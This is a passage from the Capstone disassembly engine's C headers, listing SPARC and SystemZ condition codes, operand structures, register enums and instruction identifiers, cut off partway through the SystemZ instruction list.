	SPARC_CC_FCC_NE  =  1+16+256,  // Not Equal
	SPARC_CC_FCC_E   =  9+16+256,  // Equal
	SPARC_CC_FCC_UE  = 10+16+256,  // Unordered or Equal
	SPARC_CC_FCC_GE  = 11+16+256,  // Greater or Equal
	SPARC_CC_FCC_UGE = 12+16+256,  // Unordered or Greater or Equal
	SPARC_CC_FCC_LE  = 13+16+256,  // Less or Equal
	SPARC_CC_FCC_ULE = 14+16+256,  // Unordered or Less or Equal
	SPARC_CC_FCC_O   = 15+16+256,  // Ordered
} sparc_cc;

//> Branch hint
typedef enum sparc_hint {
	SPARC_HINT_INVALID = 0,	// no hint
	SPARC_HINT_A	= 1 << 0,	// annul delay slot instruction
	SPARC_HINT_PT	= 1 << 1,	// branch taken
	SPARC_HINT_PN	= 1 << 2,	// branch NOT taken
} sparc_hint;

//> Operand type for instruction's operands
typedef enum sparc_op_type {
	SPARC_OP_INVALID = 0, // = CS_OP_INVALID (Uninitialized).
	SPARC_OP_REG, // = CS_OP_REG (Register operand).
	SPARC_OP_IMM, // = CS_OP_IMM (Immediate operand).
	SPARC_OP_MEM, // = CS_OP_MEM (Memory operand).
} sparc_op_type;

// Instruction's operand referring to memory
// This is associated with SPARC_OP_MEM operand type above
typedef struct sparc_op_mem {
	uint8_t base;	// base register
	uint8_t index;	// index register
	int32_t disp;	// displacement/offset value
} sparc_op_mem;

// Instruction operand
typedef struct cs_sparc_op {
	sparc_op_type type;	// operand type
	union {
		unsigned int reg;	// register value for REG operand
		int32_t imm;		// immediate value for IMM operand
		sparc_op_mem mem;		// base/disp value for MEM operand
	};
} cs_sparc_op;

// Instruction structure
typedef struct cs_sparc {
	sparc_cc cc;	// code condition for this insn
	sparc_hint hint;	// branch hint: encoding as bitwise OR of sparc_hint.
	// Number of operands of this instruction, 
	// or 0 when instruction has no operand.
	uint8_t op_count;
	cs_sparc_op operands[4]; // operands for this instruction.
} cs_sparc;

//> SPARC registers
typedef enum sparc_reg {
	SPARC_REG_INVALID = 0,

	SPARC_REG_F0,
	SPARC_REG_F1,
	SPARC_REG_F2,
	SPARC_REG_F3,
	SPARC_REG_F4,
	SPARC_REG_F5,
	SPARC_REG_F6,
	SPARC_REG_F7,
	SPARC_REG_F8,
	SPARC_REG_F9,
	SPARC_REG_F10,
	SPARC_REG_F11,
	SPARC_REG_F12,
	SPARC_REG_F13,
	SPARC_REG_F14,
	SPARC_REG_F15,
	SPARC_REG_F16,
	SPARC_REG_F17,
	SPARC_REG_F18,
	SPARC_REG_F19,
	SPARC_REG_F20,
	SPARC_REG_F21,
	SPARC_REG_F22,
	SPARC_REG_F23,
	SPARC_REG_F24,
	SPARC_REG_F25,
	SPARC_REG_F26,
	SPARC_REG_F27,
	SPARC_REG_F28,
	SPARC_REG_F29,
	SPARC_REG_F30,
	SPARC_REG_F31,
	SPARC_REG_F32,
	SPARC_REG_F34,
	SPARC_REG_F36,
	SPARC_REG_F38,
	SPARC_REG_F40,
	SPARC_REG_F42,
	SPARC_REG_F44,
	SPARC_REG_F46,
	SPARC_REG_F48,
	SPARC_REG_F50,
	SPARC_REG_F52,
	SPARC_REG_F54,
	SPARC_REG_F56,
	SPARC_REG_F58,
	SPARC_REG_F60,
	SPARC_REG_F62,
	SPARC_REG_FCC0,	// Floating condition codes
	SPARC_REG_FCC1,
	SPARC_REG_FCC2,
	SPARC_REG_FCC3,
	SPARC_REG_FP,
	SPARC_REG_G0,
	SPARC_REG_G1,
	SPARC_REG_G2,
	SPARC_REG_G3,
	SPARC_REG_G4,
	SPARC_REG_G5,
	SPARC_REG_G6,
	SPARC_REG_G7,
	SPARC_REG_I0,
	SPARC_REG_I1,
	SPARC_REG_I2,
	SPARC_REG_I3,
	SPARC_REG_I4,
	SPARC_REG_I5,
	SPARC_REG_I7,
	SPARC_REG_ICC,	// Integer condition codes
	SPARC_REG_L0,
	SPARC_REG_L1,
	SPARC_REG_L2,
	SPARC_REG_L3,
	SPARC_REG_L4,
	SPARC_REG_L5,
	SPARC_REG_L6,
	SPARC_REG_L7,
	SPARC_REG_O0,
	SPARC_REG_O1,
	SPARC_REG_O2,
	SPARC_REG_O3,
	SPARC_REG_O4,
	SPARC_REG_O5,
	SPARC_REG_O7,
	SPARC_REG_SP,
	SPARC_REG_Y,

	// special register
	SPARC_REG_XCC,

	SPARC_REG_ENDING,   // <-- mark the end of the list of registers

	// extras
	SPARC_REG_O6 = SPARC_REG_SP,
	SPARC_REG_I6 = SPARC_REG_FP,
} sparc_reg;

//> SPARC instruction
typedef enum sparc_insn {
	SPARC_INS_INVALID = 0,

	SPARC_INS_ADDCC,
	SPARC_INS_ADDX,
	SPARC_INS_ADDXCC,
	SPARC_INS_ADDXC,
	SPARC_INS_ADDXCCC,
	SPARC_INS_ADD,
	SPARC_INS_ALIGNADDR,
	SPARC_INS_ALIGNADDRL,
	SPARC_INS_ANDCC,
	SPARC_INS_ANDNCC,
	SPARC_INS_ANDN,
	SPARC_INS_AND,
	SPARC_INS_ARRAY16,
	SPARC_INS_ARRAY32,
	SPARC_INS_ARRAY8,
	SPARC_INS_B,
	SPARC_INS_JMP,
	SPARC_INS_BMASK,
	SPARC_INS_FB,
	SPARC_INS_BRGEZ,
	SPARC_INS_BRGZ,
	SPARC_INS_BRLEZ,
	SPARC_INS_BRLZ,
	SPARC_INS_BRNZ,
	SPARC_INS_BRZ,
	SPARC_INS_BSHUFFLE,
	SPARC_INS_CALL,
	SPARC_INS_CASX,
	SPARC_INS_CAS,
	SPARC_INS_CMASK16,
	SPARC_INS_CMASK32,
	SPARC_INS_CMASK8,
	SPARC_INS_CMP,
	SPARC_INS_EDGE16,
	SPARC_INS_EDGE16L,
	SPARC_INS_EDGE16LN,
	SPARC_INS_EDGE16N,
	SPARC_INS_EDGE32,
	SPARC_INS_EDGE32L,
	SPARC_INS_EDGE32LN,
	SPARC_INS_EDGE32N,
	SPARC_INS_EDGE8,
	SPARC_INS_EDGE8L,
	SPARC_INS_EDGE8LN,
	SPARC_INS_EDGE8N,
	SPARC_INS_FABSD,
	SPARC_INS_FABSQ,
	SPARC_INS_FABSS,
	SPARC_INS_FADDD,
	SPARC_INS_FADDQ,
	SPARC_INS_FADDS,
	SPARC_INS_FALIGNDATA,
	SPARC_INS_FAND,
	SPARC_INS_FANDNOT1,
	SPARC_INS_FANDNOT1S,
	SPARC_INS_FANDNOT2,
	SPARC_INS_FANDNOT2S,
	SPARC_INS_FANDS,
	SPARC_INS_FCHKSM16,
	SPARC_INS_FCMPD,
	SPARC_INS_FCMPEQ16,
	SPARC_INS_FCMPEQ32,
	SPARC_INS_FCMPGT16,
	SPARC_INS_FCMPGT32,
	SPARC_INS_FCMPLE16,
	SPARC_INS_FCMPLE32,
	SPARC_INS_FCMPNE16,
	SPARC_INS_FCMPNE32,
	SPARC_INS_FCMPQ,
	SPARC_INS_FCMPS,
	SPARC_INS_FDIVD,
	SPARC_INS_FDIVQ,
	SPARC_INS_FDIVS,
	SPARC_INS_FDMULQ,
	SPARC_INS_FDTOI,
	SPARC_INS_FDTOQ,
	SPARC_INS_FDTOS,
	SPARC_INS_FDTOX,
	SPARC_INS_FEXPAND,
	SPARC_INS_FHADDD,
	SPARC_INS_FHADDS,
	SPARC_INS_FHSUBD,
	SPARC_INS_FHSUBS,
	SPARC_INS_FITOD,
	SPARC_INS_FITOQ,
	SPARC_INS_FITOS,
	SPARC_INS_FLCMPD,
	SPARC_INS_FLCMPS,
	SPARC_INS_FLUSHW,
	SPARC_INS_FMEAN16,
	SPARC_INS_FMOVD,
	SPARC_INS_FMOVQ,
	SPARC_INS_FMOVRDGEZ,
	SPARC_INS_FMOVRQGEZ,
	SPARC_INS_FMOVRSGEZ,
	SPARC_INS_FMOVRDGZ,
	SPARC_INS_FMOVRQGZ,
	SPARC_INS_FMOVRSGZ,
	SPARC_INS_FMOVRDLEZ,
	SPARC_INS_FMOVRQLEZ,
	SPARC_INS_FMOVRSLEZ,
	SPARC_INS_FMOVRDLZ,
	SPARC_INS_FMOVRQLZ,
	SPARC_INS_FMOVRSLZ,
	SPARC_INS_FMOVRDNZ,
	SPARC_INS_FMOVRQNZ,
	SPARC_INS_FMOVRSNZ,
	SPARC_INS_FMOVRDZ,
	SPARC_INS_FMOVRQZ,
	SPARC_INS_FMOVRSZ,
	SPARC_INS_FMOVS,
	SPARC_INS_FMUL8SUX16,
	SPARC_INS_FMUL8ULX16,
	SPARC_INS_FMUL8X16,
	SPARC_INS_FMUL8X16AL,
	SPARC_INS_FMUL8X16AU,
	SPARC_INS_FMULD,
	SPARC_INS_FMULD8SUX16,
	SPARC_INS_FMULD8ULX16,
	SPARC_INS_FMULQ,
	SPARC_INS_FMULS,
	SPARC_INS_FNADDD,
	SPARC_INS_FNADDS,
	SPARC_INS_FNAND,
	SPARC_INS_FNANDS,
	SPARC_INS_FNEGD,
	SPARC_INS_FNEGQ,
	SPARC_INS_FNEGS,
	SPARC_INS_FNHADDD,
	SPARC_INS_FNHADDS,
	SPARC_INS_FNOR,
	SPARC_INS_FNORS,
	SPARC_INS_FNOT1,
	SPARC_INS_FNOT1S,
	SPARC_INS_FNOT2,
	SPARC_INS_FNOT2S,
	SPARC_INS_FONE,
	SPARC_INS_FONES,
	SPARC_INS_FOR,
	SPARC_INS_FORNOT1,
	SPARC_INS_FORNOT1S,
	SPARC_INS_FORNOT2,
	SPARC_INS_FORNOT2S,
	SPARC_INS_FORS,
	SPARC_INS_FPACK16,
	SPARC_INS_FPACK32,
	SPARC_INS_FPACKFIX,
	SPARC_INS_FPADD16,
	SPARC_INS_FPADD16S,
	SPARC_INS_FPADD32,
	SPARC_INS_FPADD32S,
	SPARC_INS_FPADD64,
	SPARC_INS_FPMERGE,
	SPARC_INS_FPSUB16,
	SPARC_INS_FPSUB16S,
	SPARC_INS_FPSUB32,
	SPARC_INS_FPSUB32S,
	SPARC_INS_FQTOD,
	SPARC_INS_FQTOI,
	SPARC_INS_FQTOS,
	SPARC_INS_FQTOX,
	SPARC_INS_FSLAS16,
	SPARC_INS_FSLAS32,
	SPARC_INS_FSLL16,
	SPARC_INS_FSLL32,
	SPARC_INS_FSMULD,
	SPARC_INS_FSQRTD,
	SPARC_INS_FSQRTQ,
	SPARC_INS_FSQRTS,
	SPARC_INS_FSRA16,
	SPARC_INS_FSRA32,
	SPARC_INS_FSRC1,
	SPARC_INS_FSRC1S,
	SPARC_INS_FSRC2,
	SPARC_INS_FSRC2S,
	SPARC_INS_FSRL16,
	SPARC_INS_FSRL32,
	SPARC_INS_FSTOD,
	SPARC_INS_FSTOI,
	SPARC_INS_FSTOQ,
	SPARC_INS_FSTOX,
	SPARC_INS_FSUBD,
	SPARC_INS_FSUBQ,
	SPARC_INS_FSUBS,
	SPARC_INS_FXNOR,
	SPARC_INS_FXNORS,
	SPARC_INS_FXOR,
	SPARC_INS_FXORS,
	SPARC_INS_FXTOD,
	SPARC_INS_FXTOQ,
	SPARC_INS_FXTOS,
	SPARC_INS_FZERO,
	SPARC_INS_FZEROS,
	SPARC_INS_JMPL,
	SPARC_INS_LDD,
	SPARC_INS_LD,
	SPARC_INS_LDQ,
	SPARC_INS_LDSB,
	SPARC_INS_LDSH,
	SPARC_INS_LDSW,
	SPARC_INS_LDUB,
	SPARC_INS_LDUH,
	SPARC_INS_LDX,
	SPARC_INS_LZCNT,
	SPARC_INS_MEMBAR,
	SPARC_INS_MOVDTOX,
	SPARC_INS_MOV,
	SPARC_INS_MOVRGEZ,
	SPARC_INS_MOVRGZ,
	SPARC_INS_MOVRLEZ,
	SPARC_INS_MOVRLZ,
	SPARC_INS_MOVRNZ,
	SPARC_INS_MOVRZ,
	SPARC_INS_MOVSTOSW,
	SPARC_INS_MOVSTOUW,
	SPARC_INS_MULX,
	SPARC_INS_NOP,
	SPARC_INS_ORCC,
	SPARC_INS_ORNCC,
	SPARC_INS_ORN,
	SPARC_INS_OR,
	SPARC_INS_PDIST,
	SPARC_INS_PDISTN,
	SPARC_INS_POPC,
	SPARC_INS_RD,
	SPARC_INS_RESTORE,
	SPARC_INS_RETT,
	SPARC_INS_SAVE,
	SPARC_INS_SDIVCC,
	SPARC_INS_SDIVX,
	SPARC_INS_SDIV,
	SPARC_INS_SETHI,
	SPARC_INS_SHUTDOWN,
	SPARC_INS_SIAM,
	SPARC_INS_SLLX,
	SPARC_INS_SLL,
	SPARC_INS_SMULCC,
	SPARC_INS_SMUL,
	SPARC_INS_SRAX,
	SPARC_INS_SRA,
	SPARC_INS_SRLX,
	SPARC_INS_SRL,
	SPARC_INS_STBAR,
	SPARC_INS_STB,
	SPARC_INS_STD,
	SPARC_INS_ST,
	SPARC_INS_STH,
	SPARC_INS_STQ,
	SPARC_INS_STX,
	SPARC_INS_SUBCC,
	SPARC_INS_SUBX,
	SPARC_INS_SUBXCC,
	SPARC_INS_SUB,
	SPARC_INS_SWAP,
	SPARC_INS_TADDCCTV,
	SPARC_INS_TADDCC,
	SPARC_INS_T,
	SPARC_INS_TSUBCCTV,
	SPARC_INS_TSUBCC,
	SPARC_INS_UDIVCC,
	SPARC_INS_UDIVX,
	SPARC_INS_UDIV,
	SPARC_INS_UMULCC,
	SPARC_INS_UMULXHI,
	SPARC_INS_UMUL,
	SPARC_INS_UNIMP,
	SPARC_INS_FCMPED,
	SPARC_INS_FCMPEQ,
	SPARC_INS_FCMPES,
	SPARC_INS_WR,
	SPARC_INS_XMULX,
	SPARC_INS_XMULXHI,
	SPARC_INS_XNORCC,
	SPARC_INS_XNOR,
	SPARC_INS_XORCC,
	SPARC_INS_XOR,

	// alias instructions
	SPARC_INS_RET,
	SPARC_INS_RETL,

	SPARC_INS_ENDING,   // <-- mark the end of the list of instructions
} sparc_insn;

//> Group of SPARC instructions
typedef enum sparc_insn_group {
	SPARC_GRP_INVALID = 0, // = CS_GRP_INVALID

	//> Generic groups
	// all jump instructions (conditional+direct+indirect jumps)
	SPARC_GRP_JUMP,	// = CS_GRP_JUMP

	//> Architecture-specific groups
	SPARC_GRP_HARDQUAD = 128,
	SPARC_GRP_V9,
	SPARC_GRP_VIS,
	SPARC_GRP_VIS2,
	SPARC_GRP_VIS3, 
	SPARC_GRP_32BIT,
	SPARC_GRP_64BIT,

	SPARC_GRP_ENDING,   // <-- mark the end of the list of groups
} sparc_insn_group;

#ifdef __cplusplus
}
#endif

#endif

```

`libs/Capstone/include/systemz.h`:

```h
#ifndef CAPSTONE_SYSTEMZ_H
#define CAPSTONE_SYSTEMZ_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include "platform.h"

#ifdef _MSC_VER
#pragma warning(disable:4201)
#endif

//> Enums corresponding to SystemZ condition codes
typedef enum sysz_cc {
	SYSZ_CC_INVALID = 0,	// invalid CC (default)

	SYSZ_CC_O,
	SYSZ_CC_H,
	SYSZ_CC_NLE,
	SYSZ_CC_L,
	SYSZ_CC_NHE,
	SYSZ_CC_LH,
	SYSZ_CC_NE,
	SYSZ_CC_E,
	SYSZ_CC_NLH,
	SYSZ_CC_HE,
	SYSZ_CC_NL,
	SYSZ_CC_LE,
	SYSZ_CC_NH,
	SYSZ_CC_NO,
} sysz_cc;

//> Operand type for instruction's operands
typedef enum sysz_op_type {
	SYSZ_OP_INVALID = 0, // = CS_OP_INVALID (Uninitialized).
	SYSZ_OP_REG, // = CS_OP_REG (Register operand).
	SYSZ_OP_IMM, // = CS_OP_IMM (Immediate operand).
	SYSZ_OP_MEM, // = CS_OP_MEM (Memory operand).
	SYSZ_OP_ACREG = 64,	// Access register operand.
} sysz_op_type;

// Instruction's operand referring to memory
// This is associated with SYSZ_OP_MEM operand type above
typedef struct sysz_op_mem {
	uint8_t base;	// base register
	uint8_t index;	// index register
	uint64_t length;	// BDLAddr operand
	int64_t disp;	// displacement/offset value
} sysz_op_mem;

// Instruction operand
typedef struct cs_sysz_op {
	sysz_op_type type;	// operand type
	union {
		unsigned int reg;	// register value for REG operand
		int64_t imm;		// immediate value for IMM operand
		sysz_op_mem mem;		// base/disp value for MEM operand
	};
} cs_sysz_op;

// Instruction structure
typedef struct cs_sysz {
	sysz_cc cc;		// Code condition
	// Number of operands of this instruction, 
	// or 0 when instruction has no operand.
	uint8_t op_count;
	cs_sysz_op operands[6]; // operands for this instruction.
} cs_sysz;

//> SystemZ registers
typedef enum sysz_reg {
	SYSZ_REG_INVALID = 0,

	SYSZ_REG_0, 
	SYSZ_REG_1, 
	SYSZ_REG_2, 
	SYSZ_REG_3, 
	SYSZ_REG_4, 
	SYSZ_REG_5, 
	SYSZ_REG_6, 
	SYSZ_REG_7, 
	SYSZ_REG_8, 
	SYSZ_REG_9, 
	SYSZ_REG_10,
	SYSZ_REG_11,
	SYSZ_REG_12,
	SYSZ_REG_13,
	SYSZ_REG_14,
	SYSZ_REG_15,
	SYSZ_REG_CC,
	SYSZ_REG_F0,
	SYSZ_REG_F1,
	SYSZ_REG_F2,
	SYSZ_REG_F3,
	SYSZ_REG_F4,
	SYSZ_REG_F5,
	SYSZ_REG_F6,
	SYSZ_REG_F7,
	SYSZ_REG_F8,
	SYSZ_REG_F9,
	SYSZ_REG_F10,
	SYSZ_REG_F11,
	SYSZ_REG_F12,
	SYSZ_REG_F13,
	SYSZ_REG_F14,
	SYSZ_REG_F15,

	SYSZ_REG_R0L,

	SYSZ_REG_ENDING,
} sysz_reg;

//> SystemZ instruction
typedef enum sysz_insn {
	SYSZ_INS_INVALID = 0,

	SYSZ_INS_A,
	SYSZ_INS_ADB,
	SYSZ_INS_ADBR,
	SYSZ_INS_AEB,
	SYSZ_INS_AEBR,
	SYSZ_INS_AFI,
	SYSZ_INS_AG,
	SYSZ_INS_AGF,
	SYSZ_INS_AGFI,
	SYSZ_INS_AGFR,
	SYSZ_INS_AGHI,
	SYSZ_INS_AGHIK,
	SYSZ_INS_AGR,
	SYSZ_INS_AGRK,
	SYSZ_INS_AGSI,
	SYSZ_INS_AH,
	SYSZ_INS_AHI,
	SYSZ_INS_AHIK,
	SYSZ_INS_AHY,
	SYSZ_INS_AIH,
	SYSZ_INS_AL,
	SYSZ_INS_ALC,
	SYSZ_INS_ALCG,
	SYSZ_INS_ALCGR,
	SYSZ_INS_ALCR,
	SYSZ_INS_ALFI,
	SYSZ_INS_ALG,
	SYSZ_INS_ALGF,
	SYSZ_INS_ALGFI,
	SYSZ_INS_ALGFR,
	SYSZ_INS_ALGHSIK,
	SYSZ_INS_ALGR,
	SYSZ_INS_ALGRK,
	SYSZ_INS_ALHSIK,
	SYSZ_INS_ALR,
	SYSZ_INS_ALRK,
	SYSZ_INS_ALY,
	SYSZ_INS_AR,
	SYSZ_INS_ARK,
	SYSZ_INS_ASI,
	SYSZ_INS_AXBR,
	SYSZ_INS_AY,
	SYSZ_INS_BCR,
	SYSZ_INS_BRC,
	SYSZ_INS_BRCL,
	SYSZ_INS_CGIJ,
	SYSZ_INS_CGRJ,
	SYSZ_INS_CIJ,
	SYSZ_INS_CLGIJ,
	SYSZ_INS_CLGRJ,
	SYSZ_INS_CLIJ,
	SYSZ_INS_CLRJ,
	SYSZ_INS_CRJ,
	SYSZ_INS_BER,
	SYSZ_INS_JE,
	SYSZ_INS_JGE,
	SYSZ_INS_LOCE,
	SYSZ_INS_LOCGE,
	SYSZ_INS_LOCGRE,
	SYSZ_INS_LOCRE,
	SYSZ_INS_STOCE,
	SYSZ_INS_STOCGE,
	SYSZ_INS_BHR,
	SYSZ_INS_BHER,
	SYSZ_INS_JHE,
	SYSZ_INS_JGHE,
	SYSZ_INS_LOCHE,
	SYSZ_INS_LOCGHE,
	SYSZ_INS_LOCGRHE,
	SYSZ_INS_LOCRHE,
	SYSZ_INS_STOCHE,
	SYSZ_INS_STOCGHE,
	SYSZ_INS_JH,
	SYSZ_INS_JGH,
	SYSZ_INS_LOCH,
	SYSZ_INS_LOCGH,
	SYSZ_INS_LOCGRH,
	SYSZ_INS_LOCRH,
	SYSZ_INS_STOCH,
	SYSZ_INS_STOCGH,
	SYSZ_INS_CGIJNLH,
	SYSZ_INS_CGRJNLH,
	SYSZ_INS_CIJNLH,
	SYSZ_INS_CLGIJNLH,
	SYSZ_INS_CLGRJNLH,
	SYSZ_INS_CLIJNLH,
	SYSZ_INS_CLRJNLH,
	SYSZ_INS_CRJNLH,
	SYSZ_INS_CGIJE,
	SYSZ_INS_CGRJE,
	SYSZ_INS_CIJE,
	SYSZ_INS_CLGIJE,
	SYSZ_INS_CLGRJE,
	SYSZ_INS_CLIJE,
	SYSZ_INS_CLRJE,
	SYSZ_INS_CRJE,
	SYSZ_INS_CGIJNLE,
	SYSZ_INS_CGRJNLE,
	SYSZ_INS_CIJNLE,
	SYSZ_INS_CLGIJNLE,
	SYSZ_INS_CLGRJNLE,
	SYSZ_INS_CLIJNLE,
	SYSZ_INS_CLRJNLE,
	SYSZ_INS_CRJNLE,
	SYSZ_INS_CGIJH,
	SYSZ_INS_CGRJH,
	SYSZ_INS_CIJH,
	SYSZ_INS_CLGIJH,
	SYSZ_INS_CLGRJH,
	SYSZ_INS_CLIJH,
	SYSZ_INS_CLRJH,
	SYSZ_INS_CRJH,
	SYSZ_INS_CGIJNL,
	SYSZ_INS_CGRJNL,
	SYSZ_INS_CIJNL,
	SYSZ_INS_CLGIJNL,
	SYSZ_INS_CLGRJNL,
	SYSZ_INS_CLIJNL,
	SYSZ_INS_CLRJNL,
	SYSZ_INS_CRJNL,
	SYSZ_INS_CGIJHE,
	SYSZ_INS_CGRJHE,
	SYSZ_INS_CIJHE,
	SYSZ_INS_CLGIJHE,
	SYSZ_INS_CLGRJHE,
	SYSZ_INS_CLIJHE,
	SYSZ_INS_CLRJHE,
	SYSZ_INS_CRJHE,
	SYSZ_INS_CGIJNHE,
	SYSZ_INS_CGRJNHE,
	SYSZ_INS_CIJNHE,
	SYSZ_INS_CLGIJNHE,
	SYSZ_INS_CLGRJNHE,
	SYSZ_INS_CLIJNHE,
	SYSZ_INS_CLRJNHE,
	SYSZ_INS_CRJNHE,
	SYSZ_INS_CGIJL,
	SYSZ_INS_CGRJL,
	SYSZ_INS_CIJL,
	SYSZ_INS_CLGIJL,
	SYSZ_INS_CLGRJL,
	SYSZ_INS_CLIJL,
	SYSZ_INS_CLRJL,
	SYSZ_INS_CRJL,
	SYSZ_INS_CGIJNH,
	SYSZ_INS_CGRJNH,
	SYSZ_INS_CIJNH,
	SYSZ_INS_CLGIJNH,
	SYSZ_INS_CLGRJNH,
	SYSZ_INS_CLIJNH,
	SYSZ_INS_CLRJNH,
	SYSZ_INS_CRJNH,
	SYSZ_INS_CGIJLE,
	SYSZ_INS_CGRJLE,
	SYSZ_INS_CIJLE,
	SYSZ_INS_CLGIJLE,
	SYSZ_INS_CLGRJLE,
	SYSZ_INS_CLIJLE,
	SYSZ_INS_CLRJLE,
	SYSZ_INS_CRJLE,
	SYSZ_INS_CGIJNE,
	SYSZ_INS_CGRJNE,
	SYSZ_INS_CIJNE,
	SYSZ_INS_CLGIJNE,
	SYSZ_INS_CLGRJNE,
	SYSZ_INS_CLIJNE,
	SYSZ_INS_CLRJNE,
	SYSZ_INS_CRJNE,
	SYSZ_INS_CGIJLH,
	SYSZ_INS_CGRJLH,
	SYSZ_INS_CIJLH,
	SYSZ_INS_CLGIJLH,
	SYSZ_INS_CLGRJLH,
	SYSZ_INS_CLIJLH,
	SYSZ_INS_CLRJLH,
	SYSZ_INS_CRJLH,
	SYSZ_INS_BLR,
	SYSZ_INS_BLER,
	SYSZ_INS_JLE,
	SYSZ_INS_JGLE,
	SYSZ_INS_LOCLE,
	SYSZ_INS_LOCGLE,
	SYSZ_INS_LOCGRLE,
	SYSZ_INS_LOCRLE,
	SYSZ_INS_STOCLE,
	SYSZ_INS_STOCGLE,
	SYSZ_INS_BLHR,
	SYSZ_INS_JLH,
	SYSZ_INS_JGLH,
	SYSZ_INS_LOCLH,
	SYSZ_INS_LOCGLH,
	SYSZ_INS_LOCGRLH,
	SYSZ_INS_LOCRLH,
	SYSZ_INS_STOCLH,
	SYSZ_INS_STOCGLH,
	SYSZ_INS_JL,
	SYSZ_INS_JGL,
	SYSZ_INS_LOCL,
	SYSZ_INS_LOCGL,
	SYSZ_INS_LOCGRL,
	SYSZ_INS_LOCRL,
	SYSZ_INS_LOC,
	SYSZ_INS_LOCG,
	SYSZ_INS_LOCGR,
	SYSZ_INS_LOCR,
	SYSZ_INS_STOCL,
	SYSZ_INS_STOCGL,
	SYSZ_INS_BNER,
	SYSZ_INS_JNE,
	SYSZ_INS_JGNE,
	SYSZ_INS_LOCNE,
	SYSZ_INS_LOCGNE,
	SYSZ_INS_LOCGRNE,
	SYSZ_INS_LOCRNE,
	SYSZ_INS_STOCNE,
	SYSZ_INS_STOCGNE,
	SYSZ_INS_BNHR,
	SYSZ_INS_BNHER,
	SYSZ_INS_JNHE,
	SYSZ_INS_JGNHE,
	SYSZ_INS_LOCNHE,
	SYSZ_INS_LOCGNHE,
	SYSZ_INS_LOCGRNHE,
	SYSZ_INS_LOCRNHE,
	SYSZ_INS_STOCNHE,
	SYSZ_INS_STOCGNHE,
	SYSZ_INS_JNH,
	SYSZ_INS_JGNH,
	SYSZ_INS_LOCNH,
	SYSZ_INS_LOCGNH,
	SYSZ_INS_LOCGRNH,
	SYSZ_INS_LOCRNH,
	SYSZ_INS_STOCNH,
	SYSZ_INS_STOCGNH,
	SYSZ_INS_BNLR,
	SYSZ_INS_BNLER,
	SYSZ_INS_JNLE,
	SYSZ_INS_JGNLE,
	SYSZ_INS_LOCNLE,
	SYSZ_INS_LOCGNLE,
	SYSZ_INS_LOCGRNLE,
	SYSZ_INS_LOCRNLE,
	SYSZ_INS_STOCNLE,
	SYSZ_INS_STOCGNLE,
	SYSZ_INS_BNLHR,
	SYSZ_INS_JNLH,
	SYSZ_INS_JGNLH,
	SYSZ_INS_LOCNLH,
	SYSZ_INS_LOCGNLH,
	SYSZ_INS_LOCGRNLH,
	SYSZ_INS_LOCRNLH,
	SYSZ_INS_STOCNLH,
	SYSZ_INS_STOCGNLH,
	SYSZ_INS_JNL,
	SYSZ_INS_JGNL,
	SYSZ_INS_LOCNL,
	SYSZ_INS_LOCGNL,
	SYSZ_INS_LOCGRNL,
	SYSZ_INS_LOCRNL,
	SYSZ_INS_STOCNL,
	SYSZ_INS_STOCGNL,
	SYSZ_INS_BNOR,
	SYSZ_INS_JNO,
	SYSZ_INS_JGNO,
	SYSZ_INS_LOCNO,
	SYSZ_INS_LOCGNO,
	SYSZ_INS_LOCGRNO,
	SYSZ_INS_LOCRNO,
	SYSZ_INS_STOCNO,
	SYSZ_INS_STOCGNO,
	SYSZ_INS_BOR,
	SYSZ_INS_JO,
	SYSZ_INS_JGO,
	SYSZ_INS_LOCO,
	SYSZ_INS_LOCGO,
	SYSZ_INS_LOCGRO,
	SYSZ_INS_LOCRO,
	SYSZ_INS_STOCO,
	SYSZ_INS_STOCGO,
	SYSZ_INS_STOC,
	SYSZ_INS_STOCG,
	SYSZ_INS_BASR,
	SYSZ_INS_BR,
	SYSZ_INS_BRAS,
	SYSZ_INS_BRASL,
	SYSZ_INS_J,
	SYSZ_INS_JG,
	SYSZ_INS_BRCT,
	SYSZ_INS_BRCTG,
	SYSZ_INS_C,
	SYSZ_INS_CDB,
	SYSZ_INS_CDBR,
	SYSZ_INS_CDFBR,
	SYSZ_INS_CDGBR,
	SYSZ_INS_CDLFBR,
	SYSZ_INS_CDLGBR,
	SYSZ_INS_CEB,
	SYSZ_INS_CEBR,
	SYSZ_INS_CEFBR,
	SYSZ_INS_CEGBR,
	SYSZ_INS_CELFBR,
	SYSZ_INS_CELGBR,
	SYSZ_INS_CFDBR,
	SYSZ_INS_CFEBR,
	SYSZ_INS_CFI,
	SYSZ_INS_CFXBR,
	SYSZ_INS_CG,
	SYSZ_INS_CGDBR,
	SYSZ_INS_CGEBR,
	SYSZ_INS_CGF,
	SYSZ_INS_CGFI,
	SYSZ_INS_CGFR,
	SYSZ_INS_CGFRL,
	SYSZ_INS_CGH,
	SYSZ_INS_CGHI,
	SYSZ_INS_CGHRL,
	SYSZ_INS_CGHSI,
	SYSZ_INS_CGR,
	SYSZ_INS_CGRL,
	SYSZ_INS_CGXBR,
	SYSZ_INS_CH,
	SYSZ_INS_CHF,
	SYSZ_INS_CHHSI,
	SYSZ_INS_CHI,
	SYSZ_INS_CHRL,
	SYSZ_INS_CHSI,
	SYSZ_INS_CHY,
	SYSZ_INS_CIH,
	SYSZ_INS_CL,
	SYSZ_INS_CLC,
	SYSZ_INS_CLFDBR,
	SYSZ_INS_CLFEBR,
	SYSZ_INS_CLFHSI,
	SYSZ_INS_CLFI,
	SYSZ_INS_CLFXBR,
	SYSZ_INS_CLG,
	SYSZ_INS_CLGDBR,
	SYSZ_INS_CLGEBR,
	SYSZ_INS_CLGF,
	SYSZ_INS_CLGFI,
	SYSZ_INS_CLGFR,
	SYSZ_INS_CLGFRL,
	SYSZ_INS_CLGHRL,
	SYSZ_INS_CLGHSI,
	SYSZ_INS_CLGR,
	SYSZ_INS_CLGRL,
	SYSZ_INS_CLGXBR,
	SYSZ_INS_CLHF,
	SYSZ_INS_CLHHSI,
	SYSZ_INS_CLHRL,
	SYSZ_INS_CLI,
	SYSZ_INS_CLIH,
	SYSZ_INS_CLIY,
	SYSZ_INS_CLR,
	SYSZ_INS_CLRL,
	SYSZ_INS_CLST,
	SYSZ_INS_CLY,
	SYSZ_INS_CPSDR,
	SYSZ_INS_CR,
	SYSZ_INS_CRL,
	SYSZ_INS_CS,
	SYSZ_INS_CSG,
	SYSZ_INS_CSY,
	SYSZ_INS_CXBR,
	SYSZ_INS_CXFBR,
